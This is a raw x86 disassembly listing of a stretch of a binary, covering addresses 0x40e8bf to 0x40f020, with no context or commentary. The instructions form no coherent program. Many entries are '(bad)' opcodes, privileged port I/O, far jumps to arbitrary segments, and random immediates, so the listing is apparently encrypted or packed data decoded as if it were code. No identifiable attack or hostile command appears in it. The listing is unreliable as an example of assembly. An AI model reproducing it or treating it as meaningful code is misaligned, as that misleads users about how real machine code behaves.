  40e8bf:	into   
  40e8c0:	stc    
  40e8c1:	fadd   QWORD PTR [edi+0x505b09d4]
  40e8c7:	jb     0x40e898
  40e8c9:	int    0x75
  40e8cb:	imul   edi,DWORD PTR ds:0x2da91dee,0x15
  40e8d2:	pop    edx
  40e8d3:	sbb    BYTE PTR [ebx-0x63],cl
  40e8d6:	cmp    BYTE PTR [esi],bl
  40e8d8:	mov    ebp,0xb6f7e893
  40e8dd:	icebp  
  40e8de:	sbb    eax,0x9b537bdf
  40e8e3:	(bad)  
  40e8e4:	adc    DWORD PTR [edx-0x75e4aa72],edi
  40e8ea:	lds    eax,FWORD PTR [esi-0x1e9b8539]
  40e8f0:	into   
  40e8f1:	clc    
  40e8f2:	sub    al,0x95
  40e8f4:	mov    dh,0x3b
  40e8f6:	fisubr WORD PTR [esi-0x9420edb]
  40e8fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8fd:	xchg   BYTE PTR [eax+eax*2-0x77],dh
  40e901:	and    DWORD PTR [eax+ecx*2],esi
  40e904:	cmc    
  40e905:	push   ecx
  40e906:	mov    edx,edx
  40e908:	pop    ebx
  40e909:	push   ebx
  40e90a:	mov    cl,0xba
  40e90c:	ja     0x40e8df
  40e90e:	cwde   
  40e90f:	add    esp,esi
  40e911:	sbb    BYTE PTR [edx],0x5
  40e914:	clc    
  40e915:	loope  0x40e97d
  40e917:	cmp    dh,dh
  40e919:	inc    ebx
  40e91a:	retf   
  40e91b:	push   ebp
  40e91c:	adc    ebp,ebx
  40e91e:	mov    fs,WORD PTR [ebp+0x28d87324]
  40e924:	(bad)  
  40e925:	and    eax,0x3ac6b572
  40e92a:	pop    eax
  40e92b:	test   eax,0x60205ff7
  40e930:	pcmpgtw mm3,QWORD PTR [edx+0x34]
  40e934:	or     ebp,0x1b7a535d
  40e93a:	push   ds
  40e93b:	(bad)  
  40e93c:	jge    0x40e9b2
  40e93e:	add    eax,0x6f613841
  40e943:	add    DWORD PTR [esi],eax
  40e945:	mov    dl,0xc5
  40e947:	mov    ch,0x7
  40e949:	cmp    BYTE PTR [ecx+0x40942858],0x67
  40e950:	cmp    DWORD PTR [edi],eax
  40e952:	fst    DWORD PTR [esi-0x4500a388]
  40e958:	js     0x40e924
  40e95a:	xlat   BYTE PTR ds:[ebx]
  40e95b:	cmp    BYTE PTR [esi-0x1b],cl
  40e95e:	dec    edi
  40e95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e960:	enter  0x8e98,0x17
  40e964:	call   0x5cb3430
  40e969:	mov    al,BYTE PTR [ecx-0x26c5468c]
  40e96f:	mov    BYTE PTR [ebp-0x5ee439ca],bh
  40e975:	dec    edi
  40e976:	fcomp  st(4)
  40e978:	push   edx
  40e979:	inc    ebx
  40e97a:	stos   DWORD PTR es:[edi],eax
  40e97b:	cmp    dl,BYTE PTR ds:0x7a1f81c4
  40e981:	mov    al,es:0x7f86c1c6
  40e987:	or     ebp,0xf093cf29
  40e98d:	lock adc ebp,DWORD PTR [eax-0x4ca4a1ff]
  40e994:	mov    edi,0xc03c8aea
  40e999:	mov    bh,0x78
  40e99b:	inc    eax
  40e99c:	sti    
  40e99d:	out    dx,al
  40e99e:	dec    ecx
  40e99f:	jns    0x40ea08
  40e9a1:	popa   
  40e9a2:	and    edx,ebp
  40e9a4:	(bad)  
  40e9a5:	fnstsw WORD PTR [ecx]
  40e9a7:	lds    ebp,FWORD PTR [edx+0x2c2e8957]
  40e9ad:	dec    ecx
  40e9ae:	inc    ebp
  40e9af:	push   esp
  40e9b0:	sbb    bl,0xb4
  40e9b3:	aas    
  40e9b4:	int    0xe5
  40e9b6:	cs and eax,0x13f66375
  40e9bc:	inc    edx
  40e9bd:	xchg   esi,eax
  40e9be:	(bad)  
  40e9c0:	pop    edi
  40e9c1:	mov    ds,WORD PTR fs:[edi]
  40e9c4:	int3   
  40e9c5:	hlt    
  40e9c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9c7:	push   ds
  40e9c8:	pop    edi
  40e9c9:	mov    dh,0xf
  40e9cb:	push   edx
  40e9cc:	test   al,0x68
  40e9ce:	imul   edi,DWORD PTR [ebp+0x40],0xffffffd8
  40e9d2:	test   al,0x96
  40e9d4:	inc    edi
  40e9d5:	or     dl,dl
  40e9d7:	frstor [ecx+0x233c79e3]
  40e9dd:	fst    QWORD PTR [ecx-0x8932675]
  40e9e3:	mov    esp,0xe856f9e9
  40e9e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9e9:	add    cl,bh
  40e9eb:	fisubr WORD PTR [edx-0x3a498c2b]
  40e9f1:	rcr    BYTE PTR [edi+0x4673374b],1
  40e9f7:	hlt    
  40e9f8:	mov    cl,0x8b
  40e9fa:	jge    0x40ea4a
  40e9fc:	mov    esp,0x18b72a51
  40ea01:	push   ecx
  40ea02:	leave  
  40ea03:	xchg   edx,eax
  40ea04:	aas    
  40ea05:	mov    ebp,eax
  40ea07:	ret    
  40ea08:	xor    eax,0xc79b5a9b
  40ea0d:	cmp    al,0x50
  40ea0f:	or     eax,0x4d566ab8
  40ea14:	pushf  
  40ea15:	stos   BYTE PTR es:[edi],al
  40ea16:	addr16 xchg esi,eax
  40ea18:	add    al,0xd4
  40ea1a:	out    dx,al
  40ea1b:	neg    BYTE PTR [ecx]
  40ea1d:	pop    edi
  40ea1e:	js     0x40ea3e
  40ea20:	fidiv  DWORD PTR [esp+edx*4+0x20]
  40ea24:	mov    esi,ebp
  40ea26:	jmp    0xd7d:0xe7ea237d
  40ea2d:	repnz les ebx,FWORD PTR [esi-0x10]
  40ea31:	mov    bh,0xbb
  40ea33:	ss pusha 
  40ea35:	jmp    0x6295:0x812ec348
  40ea3c:	ins    DWORD PTR es:[edi],dx
  40ea3d:	dec    edx
  40ea3e:	repz pop ebx
  40ea40:	pop    ss
  40ea41:	(bad)  
  40ea42:	int3   
  40ea43:	sti    
  40ea44:	test   eax,0x69782f37
  40ea49:	stc    
  40ea4a:	cmp    BYTE PTR [ecx],bl
  40ea4c:	rol    DWORD PTR [edi+0x12],1
  40ea4f:	retf   
  40ea50:	pop    ebx
  40ea51:	(bad)  
  40ea52:	es mov cl,0x69
  40ea55:	push   ebp
  40ea56:	push   ss
  40ea57:	lea    edi,[eax]
  40ea59:	dec    esi
  40ea5a:	bound  esi,QWORD PTR ds:[esi+0x4a69c2cf]
  40ea61:	adc    ch,BYTE PTR [edi]
  40ea63:	push   edx
  40ea64:	cli    
  40ea65:	(bad)  
  40ea67:	rcr    DWORD PTR [edx+0x33],1
  40ea6a:	sub    cl,ch
  40ea6c:	in     eax,dx
  40ea6d:	stos   DWORD PTR es:[edi],eax
  40ea6e:	mov    edx,0xbfe2426
  40ea73:	xlat   BYTE PTR ds:[ebx]
  40ea74:	inc    ecx
  40ea75:	mov    cl,ch
  40ea77:	mov    al,ds:0x6d5c5529
  40ea7c:	mov    bh,0xe7
  40ea7e:	shl    BYTE PTR [eax],1
  40ea80:	sub    ebx,0xe4b3919d
  40ea86:	or     BYTE PTR cs:[esp+edx*1-0x16b8d563],ch
  40ea8e:	mov    ds:0xc9e28871,al
  40ea93:	(bad)
  40ea97:	cmp    edi,ebp
  40ea99:	pop    edi
  40ea9a:	push   edx
  40ea9b:	jb     0x40eb16
  40ea9d:	fadd   QWORD PTR [ebx]
  40ea9f:	iret   
  40eaa0:	jl     0x40ea30
  40eaa2:	lahf   
  40eaa3:	cmp    eax,0x95debece
  40eaa8:	sub    edx,DWORD PTR gs:[esp+edi*1]
  40eaac:	inc    edi
  40eaad:	push   ss
  40eaae:	inc    ecx
  40eaaf:	rol    DWORD PTR [ecx],1
  40eab1:	pop    esp
  40eab2:	clc    
  40eab3:	push   eax
  40eab4:	call   0xbf2c:0xcde9ec5a
  40eabb:	adc    DWORD PTR [eax+0x12edb4a7],ecx
  40eac1:	xor    al,0x92
  40eac3:	mov    ah,0x9d
  40eac5:	cmp    esp,DWORD PTR [ebx-0x2a]
  40eac8:	repz out dx,al
  40eaca:	xchg   edi,eax
  40eacb:	data16 add al,0x60
  40eace:	push   0xffffffda
  40ead0:	out    0xa1,al
  40ead2:	mov    esi,edx
  40ead4:	imul   ebp,DWORD PTR [ecx],0xffffffde
  40ead7:	adc    bh,dl
  40ead9:	mov    WORD PTR [edi+esi*1-0x1a6497ef],cs
  40eae0:	pusha  
  40eae1:	dec    esi
  40eae2:	mov    bl,0xa2
  40eae4:	addr16 iret 
  40eae6:	sub    bl,dh
  40eae8:	stos   DWORD PTR es:[edi],eax
  40eae9:	mov    cl,BYTE PTR [edx-0x5]
  40eaec:	mov    ch,0xe8
  40eaee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaef:	add    ebx,DWORD PTR [edx]
  40eaf1:	mov    ebp,0xb5a59b1a
  40eaf6:	fsub   DWORD PTR [eax-0x6e]
  40eaf9:	stc    
  40eafa:	dec    eax
  40eafb:	(bad)  
  40eafc:	call   0x95545eed
  40eb01:	cwde   
  40eb02:	int3   
  40eb03:	adc    esi,DWORD PTR [edi+0x365ae5a]
  40eb09:	pop    ebp
  40eb0a:	push   ecx
  40eb0b:	test   DWORD PTR [esi-0x674b2b83],0x39bd1962
  40eb15:	adc    al,0x66
  40eb17:	mov    edx,0xaac160fa
  40eb1c:	loope  0x40ead3
  40eb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb1f:	lds    edi,FWORD PTR [eax-0x4c]
  40eb22:	jbe    0x40eadd
  40eb24:	push   0xffffffb7
  40eb26:	les    esp,FWORD PTR [ecx+0x60]
  40eb29:	inc    esi
  40eb2a:	pop    edx
  40eb2b:	mov    ds:0xcb287261,eax
  40eb30:	xchg   ebp,eax
  40eb31:	pop    edi
  40eb32:	jnp    0x40eb42
  40eb34:	mov    esp,0x12778fa4
  40eb39:	mov    cl,0x6
  40eb3b:	lods   al,BYTE PTR ds:[esi]
  40eb3c:	sub    bl,BYTE PTR [ecx+ecx*2]
  40eb3f:	rcr    ebp,cl
  40eb41:	int    0xfe
  40eb43:	and    edx,DWORD PTR [edx]
  40eb45:	mov    DWORD PTR [ecx],eax
  40eb47:	stos   BYTE PTR es:[edi],al
  40eb48:	mov    es,WORD PTR [edi+eiz*8+0x77]
  40eb4c:	jmp    0x40eafa
  40eb4e:	inc    esi
  40eb4f:	ds mov ecx,0xcbfb837e
  40eb55:	push   cs
  40eb56:	or     eax,0x998039ce
  40eb5b:	sbb    al,0x86
  40eb5d:	or     BYTE PTR [ebx-0x62],ah
  40eb60:	test   eax,0xe5165325
  40eb65:	dec    edx
  40eb66:	je     0x40eb19
  40eb68:	xor    al,BYTE PTR [edx-0x6e]
  40eb6b:	out    dx,eax
  40eb6c:	iret   
  40eb6d:	lahf   
  40eb6e:	mov    dh,0x39
  40eb70:	jge    0x40eb5b
  40eb72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb73:	add    BYTE PTR [esi-0x716f6f20],cl
  40eb79:	scas   eax,DWORD PTR es:[edi]
  40eb7a:	retf   0x1b76
  40eb7d:	xor    dl,BYTE PTR [edi+0x41]
  40eb80:	dec    ebx
  40eb81:	mov    esp,0xbab1e85d
  40eb86:	push   es
  40eb87:	xor    edx,DWORD PTR [esi]
  40eb89:	jnp    0x40ebc4
  40eb8b:	inc    esp
  40eb8c:	adc    DWORD PTR [eax],edi
  40eb8e:	aaa    
  40eb8f:	jae    0x40ebe9
  40eb91:	sbb    eax,0x383f3543
  40eb96:	jo     0x40ec0e
  40eb98:	xor    BYTE PTR [ecx-0x541151ea],bh
  40eb9e:	(bad)
  40eba2:	retf   0x5140
  40eba5:	jecxz  0x40eb68
  40eba7:	shl    BYTE PTR [ebx],1
  40eba9:	push   eax
  40ebaa:	xchg   edx,eax
  40ebab:	mov    dl,0xdf
  40ebad:	mov    esp,0x72de7687
  40ebb2:	cdq    
  40ebb3:	inc    ebx
  40ebb4:	in     al,dx
  40ebb5:	xor    ah,dh
  40ebb7:	sti    
  40ebb8:	mov    ebp,0xa881aec0
  40ebbd:	pop    esp
  40ebbe:	ret    
  40ebbf:	or     eax,0xdcedaec3
  40ebc4:	mov    edx,0xb3b70712
  40ebc9:	xchg   BYTE PTR [edx+0x51],dl
  40ebcc:	dec    ebx
  40ebcd:	and    bh,BYTE PTR [esi-0x5bd6e71d]
  40ebd3:	pop    edi
  40ebd4:	fcomi  st,st(2)
  40ebd6:	int3   
  40ebd7:	jmp    0x6173c72e
  40ebdc:	(bad)  
  40ebdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebde:	pop    edi
  40ebdf:	loop   0x40ec0d
  40ebe1:	cld    
  40ebe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe3:	out    0xc6,al
  40ebe5:	into   
  40ebe6:	out    0xfe,eax
  40ebe8:	pop    ecx
  40ebe9:	fsubr  st,st(0)
  40ebeb:	dec    ebp
  40ebec:	inc    ecx
  40ebed:	mul    BYTE PTR [eax+0x1e40ef70]
  40ebf3:	dec    eax
  40ebf4:	mov    ecx,0xa0d82319
  40ebf9:	lahf   
  40ebfa:	push   cs
  40ebfb:	push   0x41f868aa
  40ec00:	xchg   edx,eax
  40ec01:	pop    ss
  40ec02:	lea    edx,[ebx-0x6d]
  40ec05:	jne    0x40ec02
  40ec07:	push   es
  40ec08:	pop    es
  40ec09:	xchg   edx,eax
  40ec0a:	xchg   esi,eax
  40ec0b:	or     DWORD PTR [ecx+edx*4],edi
  40ec0e:	push   ss
  40ec0f:	aam    0x57
  40ec11:	bound  edi,QWORD PTR [ebx]
  40ec13:	sahf   
  40ec14:	xor    DWORD PTR [ecx+0x30761ac],esi
  40ec1a:	cld    
  40ec1b:	imul   esp,DWORD PTR [ecx+0x49],0xb72e67f2
  40ec22:	outs   dx,BYTE PTR ds:[esi]
  40ec23:	dec    ebp
  40ec24:	jnp    0x40ec2f
  40ec26:	xor    al,0xdf
  40ec28:	repnz loope 0x40eca5
  40ec2b:	cld    
  40ec2c:	xor    edx,DWORD PTR [ebp+eax*4+0x4efcd21e]
  40ec33:	stos   DWORD PTR es:[edi],eax
  40ec34:	inc    esi
  40ec35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec36:	xchg   ebx,eax
  40ec37:	push   esp
  40ec38:	push   edi
  40ec39:	mov    eax,esp
  40ec3b:	mov    edx,gs
  40ec3d:	aas    
  40ec3e:	pop    ebx
  40ec3f:	mov    al,0xa9
  40ec41:	inc    ebx
  40ec42:	push   0x34472c39
  40ec47:	mov    ds:0xec29f1f,al
  40ec4c:	adc    eax,0xb073bbc5
  40ec51:	dec    edi
  40ec52:	inc    ebx
  40ec53:	sti    
  40ec54:	or     DWORD PTR [ebx-0x5d],ebx
  40ec57:	sub    eax,ebx
  40ec59:	adc    al,0x74
  40ec5b:	and    edx,ecx
  40ec5d:	push   esp
  40ec5e:	xchg   DWORD PTR [eax],esp
  40ec60:	iret   
  40ec61:	dec    edi
  40ec62:	inc    eax
  40ec63:	xlat   BYTE PTR ds:[ebx]
  40ec64:	in     al,0x5d
  40ec66:	jle    0x40ecae
  40ec68:	jmp    0x8bf4:0x669b23ce
  40ec6f:	test   DWORD PTR [esi+0x4732d59f],ebx
  40ec75:	or     eax,0x39de759a
  40ec7a:	stos   BYTE PTR es:[edi],al
  40ec7b:	lods   al,BYTE PTR ds:[esi]
  40ec7c:	mov    WORD PTR ds:0x4d31c1d1,ds
  40ec82:	clc    
  40ec83:	fmul   DWORD PTR [ecx+edx*2-0x1]
  40ec87:	inc    esi
  40ec88:	adc    eax,0x8e105f05
  40ec8d:	dec    ebx
  40ec8e:	je     0x40ecdb
  40ec90:	ret    0x888a
  40ec93:	push   0xfffffff9
  40ec95:	shr    ah,1
  40ec97:	shr    BYTE PTR [edx+0x6c20272a],1
  40ec9d:	ja     0x40ec49
  40ec9f:	jmp    0xf392:0x7ccdaaba
  40eca6:	mov    dl,dh
  40eca8:	es adc eax,0x99004de6
  40ecae:	shl    DWORD PTR [ebx-0x3b764327],cl
  40ecb4:	mov    ecx,DWORD PTR [ebx+0x1a81eff5]
  40ecba:	push   ds
  40ecbb:	pop    ds
  40ecbc:	aaa    
  40ecbd:	lock jne 0x40ec5b
  40ecc0:	leave  
  40ecc1:	jecxz  0x40ed17
  40ecc3:	das    
  40ecc4:	cdq    
  40ecc5:	call   0xe01eaa63
  40ecca:	(bad)  
  40eccb:	xor    DWORD PTR [ebx+ecx*2],esi
  40ecce:	(bad)  
  40eccf:	jo     0x40ecb9
  40ecd1:	pop    esp
  40ecd2:	push   es
  40ecd3:	mov    edx,0x20a477c9
  40ecd8:	mov    edi,0xa1e9d63b
  40ecdd:	lds    esp,FWORD PTR [eax]
  40ecdf:	retf   
  40ece0:	es daa 
  40ece2:	xchg   ecx,eax
  40ece3:	loop   0x40ec87
  40ece5:	sbb    eax,0xc71f4c00
  40ecea:	dec    esp
  40eceb:	mov    ecx,0xc8a86203
  40ecf0:	mov    cl,0x4e
  40ecf2:	push   eax
  40ecf3:	jb     0x40ec9a
  40ecf5:	and    DWORD PTR [edi],ebp
  40ecf7:	icebp  
  40ecf8:	dec    esp
  40ecf9:	and    al,0xbf
  40ecfb:	mov    bh,0xbd
  40ecfd:	jns    0x40ed65
  40ecff:	rcr    DWORD PTR [edi-0x3e],0x42
  40ed03:	dec    edi
  40ed04:	popa   
  40ed05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed06:	cwde   
  40ed07:	rcl    DWORD PTR [eax+0x70a75b40],cl
  40ed0d:	jg     0x40ecd3
  40ed0f:	(bad)  
  40ed11:	mov    edx,0x159048c8
  40ed16:	add    al,0xc0
  40ed18:	(bad)  
  40ed19:	ror    BYTE PTR [ecx],cl
  40ed1b:	xchg   esi,eax
  40ed1c:	rcr    BYTE PTR [ecx-0x36],1
  40ed1f:	adc    eax,ebp
  40ed21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed22:	ja     0x40ed76
  40ed24:	or     BYTE PTR [esi],0xb1
  40ed27:	ins    BYTE PTR es:[edi],dx
  40ed28:	mov    bl,0xfe
  40ed2a:	leave  
  40ed2b:	xchg   esi,eax
  40ed2c:	outs   dx,DWORD PTR ds:[esi]
  40ed2d:	js     0x40ed32
  40ed2f:	imul   bh
  40ed31:	fisttp DWORD PTR [ebx+eiz*1]
  40ed34:	lds    eax,FWORD PTR [ebp+ecx*2-0x172ad45f]
  40ed3b:	sub    BYTE PTR ds:0xcb8024d5,0x12
  40ed42:	imul   eax,DWORD PTR [eax],0x607e9804
  40ed48:	mov    eax,ds:0x12babd77
  40ed4d:	xor    eax,0x465135d1
  40ed52:	out    dx,al
  40ed53:	loop   0x40eda2
  40ed55:	stos   BYTE PTR es:[edi],al
  40ed56:	fwait
  40ed57:	pushf  
  40ed58:	(bad)  
  40ed59:	jge    0x40ed75
  40ed5b:	adc    al,0x26
  40ed5d:	fimul  WORD PTR [edi]
  40ed5f:	dec    BYTE PTR [edx+0x3682175b]
  40ed65:	iret   
  40ed66:	jns    0x40ed08
  40ed68:	rcr    BYTE PTR [esi],0x65
  40ed6b:	push   es
  40ed6c:	jno    0x40edac
  40ed6e:	or     eax,0xff42218d
  40ed73:	and    dl,cl
  40ed75:	rcl    esp,cl
  40ed77:	in     eax,dx
  40ed78:	dec    ecx
  40ed79:	mov    eax,0x76239ec5
  40ed7e:	imul   eax,DWORD PTR [edx+0x37],0xed8289e4
  40ed85:	jbe    0x40eda4
  40ed87:	pop    ss
  40ed88:	xlat   BYTE PTR ds:[ebx]
  40ed89:	add    ah,BYTE PTR [esi+0x29]
  40ed8c:	(bad)  
  40ed8d:	jo     0x40eddb
  40ed8f:	pop    ds
  40ed90:	push   ebp
  40ed91:	mov    edi,0x31bd3a07
  40ed96:	into   
  40ed97:	mov    edi,0x2cd044df
  40ed9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed9d:	xor    DWORD PTR [ebx],edi
  40ed9f:	add    eax,0xd9371fc1
  40eda4:	xor    edi,edi
  40eda6:	xchg   edx,eax
  40eda7:	push   ds
  40eda8:	loope  0x40ed69
  40edaa:	and    ch,ch
  40edac:	mov    ds:0x5d32ef3f,al
  40edb1:	cmp    dl,BYTE PTR [ebx+0x5d76f1df]
  40edb7:	repnz or al,0x39
  40edba:	sahf   
  40edbb:	inc    ebx
  40edbc:	cmp    ecx,eax
  40edbe:	shr    DWORD PTR [esp+eiz*8],0x4d
  40edc2:	fistp  QWORD PTR [edi]
  40edc4:	or     BYTE PTR [eax+eax*2],dh
  40edc7:	cmp    ebx,DWORD PTR [eax+0x5b]
  40edca:	je     0x40eda0
  40edcc:	jb     0x40ed79
  40edce:	call   0xdec0:0x71b1d5cf
  40edd5:	shl    DWORD PTR [edx+0x29],cl
  40edd8:	adc    edi,DWORD PTR [ebp-0x40904af7]
  40edde:	(bad)  
  40eddf:	cli    
  40ede0:	(bad)  
  40ede2:	in     al,dx
  40ede3:	push   esi
  40ede4:	jg     0x40ee33
  40ede6:	js     0x40edb4
  40ede8:	push   cs
  40ede9:	loop   0x40ed87
  40edeb:	push   ebx
  40edec:	pop    ebx
  40eded:	and    ebx,esp
  40edef:	xor    eax,0xa789efe6
  40edf4:	out    0xcd,al
  40edf6:	xor    al,0xf3
  40edf8:	scas   al,BYTE PTR es:[edi]
  40edf9:	pusha  
  40edfa:	jp     0x40ee61
  40edfc:	sub    eax,0xcf4b2cc7
  40ee01:	repz mov ds:0xe65585cf,al
  40ee08:	test   al,0x8f
  40ee0a:	sbb    al,0x50
  40ee0c:	mov    esp,0x9974ee6c
  40ee11:	pop    esi
  40ee12:	jp     0x40ee6f
  40ee14:	ret    
  40ee15:	loopne 0x40edfd
  40ee17:	push   esp
  40ee18:	push   ebp
  40ee19:	inc    ebx
  40ee1a:	xor    edx,ebp
  40ee1c:	jg     0x40ee8e
  40ee1e:	loop   0x40ee55
  40ee20:	call   0xb9e01801
  40ee25:	scas   al,BYTE PTR es:[edi]
  40ee26:	mov    esp,edx
  40ee28:	sub    DWORD PTR [ecx],0x5e5dab
  40ee2e:	stos   BYTE PTR es:[edi],al
  40ee2f:	ins    BYTE PTR es:[edi],dx
  40ee30:	out    0x79,eax
  40ee32:	(bad)  
  40ee33:	std    
  40ee34:	fdiv   QWORD PTR [ecx]
  40ee36:	stos   BYTE PTR es:[edi],al
  40ee37:	xor    ebp,DWORD PTR [eax-0x1b7c1e65]
  40ee3d:	sub    eax,0x4244284e
  40ee42:	dec    ebx
  40ee43:	retf   0xe5f6
  40ee46:	mov    eax,0x4cf09c07
  40ee4b:	and    al,0xdb
  40ee4d:	test   al,0x12
  40ee4f:	fs call 0x19654f57
  40ee55:	cli    
  40ee56:	adc    DWORD PTR [ebx],0x2e
  40ee59:	inc    esi
  40ee5a:	mov    edi,esp
  40ee5c:	loope  0x40ee24
  40ee5e:	dec    eax
  40ee5f:	leave  
  40ee60:	or     DWORD PTR [esp+edx*8-0x4f273377],esi
  40ee67:	fsubr  DWORD PTR [esi]
  40ee69:	mov    ds:0xdfbc5a95,al
  40ee6e:	arpl   bp,sp
  40ee70:	add    eax,0xd7d08a1a
  40ee75:	mov    ch,0x71
  40ee77:	retf   
  40ee78:	sbb    eax,0x974257ed
  40ee7d:	dec    eax
  40ee7e:	xchg   edx,eax
  40ee7f:	mov    esi,0xe9f546ab
  40ee84:	push   ebp
  40ee85:	lock mov ds:0xa533878e,al
  40ee8b:	test   eax,0xd83c511c
  40ee90:	repz retf 
  40ee92:	add    BYTE PTR [ebx+0x368ce2ae],0x99
  40ee99:	test   al,0x44
  40ee9b:	adc    al,0x77
  40ee9d:	jbe    0x40ee41
  40ee9f:	mul    BYTE PTR [eax+eiz*8]
  40eea2:	sbb    eax,ebx
  40eea4:	sub    DWORD PTR [esp+ebp*2+0x4790c127],ecx
  40eeab:	mov    ah,ah
  40eead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeae:	pop    ecx
  40eeaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeb0:	xor    BYTE PTR [eax-0x4c3f3242],bh
  40eeb6:	and    DWORD PTR [edi+0x4c],edi
  40eeb9:	pusha  
  40eeba:	xor    ebp,DWORD PTR [ebx+0x62]
  40eebd:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eebf:	in     al,0xe0
  40eec1:	imul   DWORD PTR [ebx+0x1fc23e83]
  40eec7:	pop    eax
  40eec8:	add    ecx,DWORD PTR [esi+0x883d63]
  40eece:	setb   BYTE PTR [edx-0x20]
  40eed2:	adc    bh,cl
  40eed4:	xchg   ebp,eax
  40eed5:	xchg   BYTE PTR [eax],ch
  40eed7:	lods   eax,DWORD PTR ds:[esi]
  40eed9:	daa    
  40eeda:	sahf   
  40eedb:	mov    ebp,0xd96c2c2d
  40eee0:	loop   0x40eec1
  40eee2:	(bad)  
  40eee3:	sbb    eax,0xc72d1ab5
  40eee8:	(bad)  
  40eee9:	mov    esi,0xedc0404a
  40eeee:	ins    DWORD PTR es:[edi],dx
  40eeef:	imul   esp,DWORD PTR [edx+0x1b],0xffffffd9
  40eef3:	fsub   st(1),st
  40eef5:	push   ss
  40eef6:	lods   eax,DWORD PTR ds:[esi]
  40eef7:	out    0xc4,al
  40eef9:	push   ecx
  40eefa:	out    0xa2,eax
  40eefc:	sbb    BYTE PTR [eax],bh
  40eefe:	mov    al,0xf4
  40ef00:	add    dh,BYTE PTR [ebx+0x6e]
  40ef03:	pop    esi
  40ef04:	(bad)  
  40ef05:	xchg   edx,eax
  40ef06:	xchg   BYTE PTR [ebx+edi*2],dh
  40ef09:	push   edi
  40ef0a:	les    ecx,FWORD PTR [esi]
  40ef0c:	and    BYTE PTR [ebp+0x5d],0xb6
  40ef10:	add    al,0x9
  40ef12:	sar    DWORD PTR [esi-0x23],cl
  40ef15:	retf   
  40ef16:	xchg   esp,eax
  40ef17:	or     ecx,DWORD PTR [edx-0x25100f4d]
  40ef1d:	mov    eax,0x7655d7e3
  40ef22:	pusha  
  40ef23:	outs   dx,DWORD PTR ds:[esi]
  40ef24:	(bad)  
  40ef25:	loop   0x40eeef
  40ef27:	pushf  
  40ef28:	frstor [ebp+0x31451f31]
  40ef2e:	mov    cs:0x609258b1,eax
  40ef34:	add    BYTE PTR [ebp+0x7],ch
  40ef37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef38:	or     DWORD PTR ds:0xa7f78916,edi
  40ef3e:	rcr    BYTE PTR [ebp+edx*4+0x608a88f],cl
  40ef45:	test   al,0x3a
  40ef47:	ret    
  40ef48:	sti    
  40ef49:	push   eax
  40ef4a:	fst    DWORD PTR [esi-0x20]
  40ef4d:	aas    
  40ef4e:	mov    eax,0x8dedf7d4
  40ef53:	mov    dl,0xee
  40ef55:	inc    eax
  40ef56:	cdq    
  40ef57:	sahf   
  40ef58:	(bad)  
  40ef59:	div    BYTE PTR [ecx-0x4f]
  40ef5c:	sub    ecx,DWORD PTR [ebx+0x3c4636b6]
  40ef62:	cli    
  40ef63:	test   bh,dh
  40ef65:	loope  0x40ef09
  40ef67:	mov    esi,0x9368bcf6
  40ef6c:	pop    esp
  40ef6d:	inc    edx
  40ef6e:	call   0x8b69:0x63668b33
  40ef75:	ror    edi,0x85
  40ef78:	ret    
  40ef79:	fidivr DWORD PTR [ebp+eax*4-0x11]
  40ef7d:	mov    esp,0x9a6f7dc0
  40ef82:	pop    ds
  40ef83:	jb     0x40efae
  40ef85:	jae    0x40efe8
  40ef87:	inc    ebx
  40ef88:	dec    esp
  40ef89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef8a:	sbb    BYTE PTR [ebx],bl
  40ef8c:	xchg   edx,eax
  40ef8d:	cld    
  40ef8e:	das    
  40ef8f:	sti    
  40ef90:	jp     0x40efc6
  40ef92:	pop    ds
  40ef93:	mov    ecx,0x1689116b
  40ef98:	jo     0x40efce
  40ef9a:	or     eax,0xb706804
  40ef9f:	retf   0x209f
  40efa2:	test   BYTE PTR [esi-0x1683205],ah
  40efa8:	mov    ecx,0xf45953c3
  40efad:	sti    
  40efae:	arpl   WORD PTR [ecx+0xb25e06d],si
  40efb4:	xchg   BYTE PTR [edx],bh
  40efb6:	mov    esp,0x774b467
  40efbb:	ins    DWORD PTR es:[edi],dx
  40efbc:	mov    ebp,0x1a516d68
  40efc1:	test   edx,edi
  40efc3:	add    BYTE PTR [edi],cl
  40efc5:	sbb    eax,0x884b1800
  40efca:	push   esi
  40efcb:	pushf  
  40efcc:	sbb    ah,BYTE PTR [ecx-0x3d]
  40efcf:	js     0x40f04d
  40efd1:	and    BYTE PTR [ecx+0x67231f91],cl
  40efd7:	fist   DWORD PTR [esi+0xa405a4b]
  40efdd:	xor    esi,DWORD PTR [edi-0x95773b2]
  40efe3:	jle    0x40ef9a
  40efe5:	sti    
  40efe6:	mov    esp,0x433fd965
  40efeb:	sub    edi,DWORD PTR [esi-0x4925a930]
  40eff1:	or     bl,dh
  40eff3:	test   al,0x55
  40eff5:	push   ecx
  40eff6:	fwait
  40eff7:	aam    0xfa
  40eff9:	imul   ebx,DWORD PTR [esi],0xffffffb0
  40effc:	fidiv  WORD PTR [ebx-0x80]
  40efff:	sub    eax,0xa1a36ad6
  40f004:	and    esp,DWORD PTR [esi]
  40f006:	mov    edx,0x2968cba8
  40f00b:	in     eax,dx
  40f00c:	out    0xdc,eax
  40f00e:	fnsave [esi]
  40f010:	sti    
  40f011:	jmp    0xe71cb215
  40f016:	inc    eax
  40f017:	daa    
  40f018:	mov    edi,0xfc495245
  40f01d:	retf   0x7f80
  40f020:	js     0x40eff7
